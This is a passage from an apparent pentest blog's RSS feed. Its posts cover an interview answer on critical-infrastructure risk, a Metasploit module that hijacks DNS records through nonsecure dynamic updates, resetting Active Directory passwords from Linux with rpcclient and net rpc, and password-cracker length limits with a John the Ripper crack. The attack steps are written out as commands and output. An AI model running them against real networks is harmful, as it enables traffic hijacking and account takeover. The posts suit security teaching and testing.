&lt;h3 id=&#34;we-often-hear-about-cyber-weapons-and-cyber-attacks-against-critical-infrastructure-do-you-believe-concrete-the-risk-of-a-major-and-lethal-cyber-attack-against-a-critical-infrastructure&#34;&gt;We often hear about cyber weapons and cyber attacks against critical infrastructure. Do you believe concrete the risk of a major and lethal cyber attack against a critical infrastructure?&lt;/h3&gt;

&lt;p&gt;Yes, but in what country? Is the U.S. even the most connected these days? I doubt it. In counter point I would like you to watch the following for actual statistics on the matter by &lt;a href=&#34;https://twitter.com/spacerog&#34;&gt;@SpaceRogue&lt;/a&gt;:&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cZPv-wro-O8&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h3 id=&#34;why-and-which-are-the-most-exposed-ci&#34;&gt;Why and which are the most exposed CI?&lt;/h3&gt;

&lt;p&gt;Same issue with the industry question, not going to point at the weakest link. I guess an argument to the fact that making light of these targets helps to force action, but I think unless you have had your head in the sand every knows of &amp;ldquo;Cyber Threats&amp;rdquo; these days, and a heading like:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Security Expert Rob Fuller says that Widgets are the most vulnerable target in U.S. Infrastructure&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;doesn&amp;rsquo;t really further any message or get anyone&amp;rsquo;s attention to something they don&amp;rsquo;t already know.&lt;/p&gt;

&lt;p&gt;Thanks for your time. Have an awesome 4th of July.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Dynamic DNS Update Module</title>
      <link>https://malicious.link/post/2017/dynamic-dns-update-module/</link>
      <pubDate>Sun, 25 Jun 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/dynamic-dns-update-module/</guid>
      <description>

&lt;p&gt;&amp;ldquo;Secure&amp;rdquo; DNS updates is the default in Windows, but there is an option to allow &amp;ldquo;Nonsecure&amp;rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://malicious.link/images/2017/nonsecure_dns_updates.png&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;The module was originally written by &lt;a href=&#34;https://twitter.com/kingsabri&#34;&gt;King Sabri&lt;/a&gt;, with many touch ups and the spoofing capability by &lt;a href=&#34;https://twitter.com/busterbcook&#34;&gt;busterbcook&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can read up on the pull request in &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/8599&#34;&gt;pr/#8599&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Just to drive home the point I&amp;rsquo;ll be using my Exchange server as a target:&lt;/p&gt;

&lt;p&gt;&lt;center&gt; &lt;strong&gt;You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.&lt;/strong&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://malicious.link/images/2017/before_dns_update.png&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info

;; ANSWER SECTION:
sdexchange.sittingduck.info. 1200 IN    A   192.168.80.13
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is what the module looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
msf auxiliary(dyn_dns_update) &amp;gt; show options

Module options (auxiliary/admin/dns/dyn_dns_update):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CHOST                      no        The source address to use for queries and updates
   DOMAIN                     yes       The domain name
   HOSTNAME                   yes       The name record you want to add
   IP                         no        The IP you want to assign to the record
   RHOST                      yes       The vulnerable DNS server IP address
   TYPE      A                yes       The record type you want to add. (Accepted: A, AAAA, CNAME, TXT)
   VALUE                      no        The string to be added with TXT or CNAME record


Auxiliary action:

   Name    Description
   ----    -----------
   UPDATE  Add or update a record. (default)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It has 3 different actions, but you&amp;rsquo;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions

Auxiliary actions:

   Name    Description
   ----    -----------
   ADD     Add a new record. Fail if it already exists.
   DELETE  Delete an existing record.
   UPDATE  Add or update a record. (default)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here are the settings I chose. Notice the IP address that I&amp;rsquo;m injecting isn&amp;rsquo;t on the same subnet as the domain.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
DOMAIN =&amp;gt; sittingduck.info
msf auxiliary(dyn_dns_update) &amp;gt; set HOSTNAME sdexchange
HOSTNAME =&amp;gt; sdexchange
msf auxiliary(dyn_dns_update) &amp;gt; set IP 100.100.100.100
IP =&amp;gt; 100.100.100.100
msf auxiliary(dyn_dns_update) &amp;gt; set RHOST 192.168.80.10
RHOST =&amp;gt; 192.168.80.10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the output:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run

[+] Found existing A record for sdexchange.sittingduck.info
[*] Sending dynamic DNS delete message...
[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been deleted!
[*] Sending dynamic DNS add message...
[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been added!
[*] Auxiliary module execution completed
msf auxiliary(dyn_dns_update) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/after_dns_update.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This will stay until fixed or another dynamic DNS update is performed from the original server (every 24 hours or so).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Reset AD user password with Linux</title>
      <link>https://malicious.link/post/2017/reset-ad-user-password-with-linux/</link>
      <pubDate>Fri, 23 Jun 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/reset-ad-user-password-with-linux/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/delegate_passwordreset.png&#34; alt=&#34;&#34; /&gt;
&lt;em&gt;Image showing how to allow users to be able to reset user passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; If you are here because you are a helpdesk person, this is a pentest blog, so it&amp;rsquo;s coming from the mindset of a pentester, but this could just as easily be used for legitmate purposes.&lt;/p&gt;

&lt;p&gt;There are a great many things you can do with &lt;code&gt;rpcclient&lt;/code&gt; for examples outside of this blog post see these posts by &lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html&#34;&gt;Enumerating user accounts on Linux and OS X with rpcclient&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2007/08/more-of-using-rpcclient-to-find.html&#34;&gt;More of using rpcclient to find usernames&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2010/06/more-with-rpcclient.html&#34;&gt;more with rpcclient&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2012/05/from-low-to-pwned-5-honorable-mention.html&#34;&gt;From LOW to PWNED [5] Honorable Mention: Null Sessions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There have been plenty of times on pentests where I have had access to IT or helpdesk related accounts that had limited administrative powers. Almost always I or someone on the team found an internal wiki or share that they did have access to (and then we moved on from there), however they almost always have the ability to reset passwords.&lt;/p&gt;

&lt;p&gt;I was unable to find any documentation on how to do this from a Linux host, or at the very least to do it without Active Directory Users and Computers (ADUC), which would require a Windows machine. And figuring out how to run ADUC through a meterpreter sessions wasn&amp;rsquo;t an hurdle I ever had time for in engagements. :)&lt;/p&gt;

&lt;p&gt;Due to me being dumb and resetting a password of my own in my lab to something I couldn&amp;rsquo;t remember, I finally had the time to figure it out.&lt;/p&gt;

&lt;p&gt;If you have Samba client tools (&lt;code&gt;smbclient&lt;/code&gt;) installed, you can use &lt;code&gt;rpcclient&lt;/code&gt;.  Out of the gate, you can auth with password or kerberos (this is especially useful in situations where you have dropped into a user that has an active kerberos token or you can make one):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# rpcclient -U helpdesk //192.168.80.10
Enter helpdesk&#39;s password:
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you have the package &lt;code&gt;passing-the-hash&lt;/code&gt;, you can even do this with just a NTLM hash.&lt;/p&gt;

&lt;p&gt;In order to change a password you neet to use the &lt;code&gt;setuserinfo2&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will not be able to change the password of anyone with &lt;code&gt;AdminCount = 1&lt;/code&gt; (aka Domain Admins and other high priv accounts):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 ima-domainadmin 23 &#39;ASDqwe123&#39;
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But you can very easily target users who have alternate admin accounts:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 adminuser 23 &#39;ASDqwe123&#39;
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes it would be nice if there was any sort of confirmation&amp;hellip;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;23&lt;/code&gt; came from &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/cc245617.aspx&#34;&gt;this MSDN article&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you have the package &lt;code&gt;samba-common-bin&lt;/code&gt; you can also do this with the &lt;code&gt;net&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
Enter new password for adminuser:
Enter helpdesk&#39;s password:
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Huge thanks for &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;Beto Solino&lt;/a&gt; of &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt; fame for his help figuring this out.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Password Magic Numbers</title>
      <link>https://malicious.link/post/2017/05-06-2017-password-magic-numbers/</link>
      <pubDate>Sat, 06 May 2017 15:00:00 -0400</pubDate>
      
      <guid>https://malicious.link/post/2017/05-06-2017-password-magic-numbers/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/LAN_Manager&#34;&gt;LanManager passwords&lt;/a&gt; (&amp;ldquo;LM&amp;rdquo;) is a very old and well known password hashing function. Used way back in &lt;a href=&#34;https://en.wikipedia.org/wiki/OS/2&#34;&gt;OS/2 Warp&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/MS-Net&#34;&gt;MS-Net&lt;/a&gt; (networking for MS-DOS). It was great in it&amp;rsquo;s day, however how it worked was not sustainable. The hashing was performed only haver uppercasing and splitting the password into two 7 character chunks. This meant that even if your password was 14 characters long, it was still technically only two 7 character passwords, that could be cracked separately.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/NT_LAN_Manager&#34;&gt;NTLM&lt;/a&gt;, it&amp;rsquo;s big brother came along with Windows NT (Windows 95 and Windows 98 did not have NTLM, and we don&amp;rsquo;t speak about Windows ME). Windows to this day stores both the LM and NTLM versions of passwords. This meant that if your password was under 15 characters it would still be stored in that LM crackable format (&lt;a href=&#34;https://support.microsoft.com/en-us/help/299656/how-to-prevent-windows-from-storing-a-lan-manager-hash-of-your-password-in-active-directory-and-local-sam-databases&#34;&gt;unless storage of LM is being prevented, which has become default&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;This is where the first &amp;ldquo;magic number&amp;rdquo; for passwords comes from. In many pentests I recommended in my reports that all sensitive passwords have a minimum of &lt;strong&gt;15 characters&lt;/strong&gt;. By doing this, no matter what the setting was for the storage of their passwords on whatever system they might be stored on, it would never be stored in LM. I even recommended it for normal users, but obviously that recommendation never stuck.&lt;/p&gt;

&lt;p&gt;Recently I discovered a new &amp;ldquo;magic number&amp;rdquo; for passwords: &lt;strong&gt;28&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Before I get into this, all of this information came from &lt;a href=&#34;https://twitter.com/hashcat&#34;&gt;Atom&lt;/a&gt; (Hashcat primary developer) &lt;a href=&#34;https://twitter.com/SolarDiz&#34;&gt;Solar Designer&lt;/a&gt; (John the Ripper) and &lt;a href=&#34;https://github.com/magnumripper&#34;&gt;Magnum&lt;/a&gt; (John the Ripper). I&amp;rsquo;m just putting it together because I had no idea this existed and I&amp;rsquo;ve been cracking passwords using both of these tools for ages. Huge thanks to them for all their help and patience.&lt;/p&gt;

&lt;p&gt;It turns out, that password cracking tools have maximum character lengths for passwords. This boggled my mind for a while but it makes total sense once Atom explained that it has to do with how the tools store the password candidates (dictionary words or generated clear texts to be used in the hash comparison attempt). They are stored in GPU registers, and unfortunately the speed of storing it there comes at a price. That price is that there isn&amp;rsquo;t enough registers to store candidates over certain lengths. The maximum lengths are specific to how each hashing function works so some maximum lengths are longer than others. The general rule of thumb at least in the world of Hashcat is 55 characters.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The primary reason behind these specific length limits is that exceeding them doubles the amount of processing. The register pressure is a secondary aspect, and mostly limited to GPUs. (On CPUs, the candidate passwords themselves are not in registers.)&lt;/p&gt;

&lt;p&gt;&amp;ndash; Solar Designer&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/solardiz/status/861183622950334464&#34;&gt;https://twitter.com/solardiz/status/861183622950334464&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In the world of Windows however, passwords are stored using UTF16-LE. This means that password candidates are automatically double the character length as most other hashing functions, halving the possible maximum down to 27 characters. This means that lets say your password is a very well known quote like:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;You can&amp;rsquo;t handle the truth!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;who&amp;rsquo;s NTLM hash is &lt;code&gt;E478B144E719CFF85A5F2028F0DF1808&lt;/code&gt; you wouldn&amp;rsquo;t be able to crack it, even if it was in your dictionary, because it&amp;rsquo;s 28 characters. This limitation extends to any UTF16 based hash (which almost all Windows based hashing is)&lt;/p&gt;

&lt;p&gt;How do you know what the limits are? Well John the Ripper has a handy dandy argument that tells you specifics of each format:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/jtr/run# ./john --list=format-details --format=nt
NT      81      24      24      0002000f        43      MD4 256/256 AVX2 8x3  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see in the second column it says &amp;ldquo;81&amp;rdquo;. This is the maximum number of UTF8 characters that it can fit for that format type, but because John the Ripper supports up to the full standard of 3 bytes in UTF16, the maximum again, is 27 characters.&lt;/p&gt;

&lt;p&gt;You can read more here:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/issues/2529&#34;&gt;https://github.com/magnumripper/JohnTheRipper/issues/2529&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-users/2017/05/04/8&#34;&gt;http://www.openwall.com/lists/john-users/2017/05/04/8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-users/2017/05/04/9&#34;&gt;http://www.openwall.com/lists/john-users/2017/05/04/9&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you read through the openwall posts then you saw there is a way to compile &lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;John (jumbo)&lt;/a&gt; to squeeze out a few more characters:&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;This will slow down cracking considerably&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/bigjohn/src/#./configure --disable-native-tests CFLAGS=&#39;-O2 -mno-sse2 -mno-mmx -U__SSE__&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets see what this gets us:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/bigjohn/run/# ./john --list=format-details --format=nt
NT      125     1       1       0002000f        43      MD4 32/64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We now have 125 total characters total (not just 41 - &lt;a href=&#34;https://twitter.com/solardiz/status/861182438818684929&#34;&gt;thanks Solar Designer for the update&lt;/a&gt;). And as you can probably guess, it cracks the password just fine now:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@crackingbox:/opt/bigjohn/run/# ./john /tmp/hashtest.txt --format=nt --wordlist=/tmp/list.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 32/64])
Remaining 1 password hash
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
You can&#39;t handle the truth! (Martha)
1g 0:00:00:00 DONE (2017-05-07 00:58) 33.33g/s 133.3p/s 133.3c/s 133.3C/s You can&#39;t handle the truth!
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hashcat also has a branch that supports longer passwords, but currently doesn&amp;rsquo;t support NTLM:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/hashcat/hashcat/tree/longer_passwords&#34;&gt;https://github.com/hashcat/hashcat/tree/longer_passwords&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So now my recommendations for passwords, at least in the Windows world is 28 characters or more makes it so that without tweaking, your 28 character Jack Nicholson quote based password is safer (I mean, Mimikatz still works, and keyloggers, and so on and so forth&amp;hellip;)&lt;/p&gt;

&lt;p&gt;28 characters is a bit tough to force on standard users, but making sure that at least your service, admin and &amp;ldquo;high risk&amp;rdquo; accounts are &amp;gt; 28 is a good step.&lt;/p&gt;

&lt;p&gt;Solar Designer also pointed me at the Openwall product called &lt;a href=&#34;http://www.openwall.com/passwdqc/&#34;&gt;passwdqc&lt;/a&gt; which is much more affordable than other password products I&amp;rsquo;ve seen for enterprises. Here is a direct link to the Windows version that allows 30 day trial: &lt;a href=&#34;http://www.openwall.com/passwdqc/windows/&#34;&gt;http://www.openwall.com/passwdqc/windows/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I definitely could get things wrong in this post, it&amp;rsquo;s very new to me and I&amp;rsquo;m still digging. Please hit me up with any corrections via comments below, Facbook, Twitter, IRC, Google Hangouts, Wire, Signal, AIM, Slack, LinkedIn, Mastadon, WhatsApp, Skype, smoke signals&amp;hellip; however you wish, I&amp;rsquo;ll update this post as needed. Thanks!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&amp;ndash;
mubix&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
